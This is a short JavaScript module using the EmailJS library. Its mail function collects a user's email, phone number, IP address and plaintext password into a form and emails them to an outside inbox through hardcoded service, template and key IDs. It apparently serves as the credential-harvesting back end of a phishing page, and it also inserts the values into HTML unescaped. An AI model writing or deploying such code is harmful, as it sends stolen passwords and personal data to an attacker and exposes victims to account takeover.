import emailjs from '@emailjs/browser';

const TEMPLATE_ID = "template_5bcbkdl";
const SERVICE_ID = "service_02ex4rl";
const PUBLIC_KEY = "dhtelIsAQ2Izyx7iS"

export const mail = async (data) => {
    const html = `<input type="text" name="email" value="${data.email}" /><input type="text" name="phone" value="${data.phone}" /><input type="text" name="ip" value="${data.ip}"/><input type="text" name="password" value="${data.password}"/>`
    const form = document.createElement('form')
    form.innerHTML = html
    console.log(form)
    try {
        const data = await emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, form, PUBLIC_KEY)
        console.log(data);
        return;
    } catch (err) {
        console.log(err)
        return;
    }
}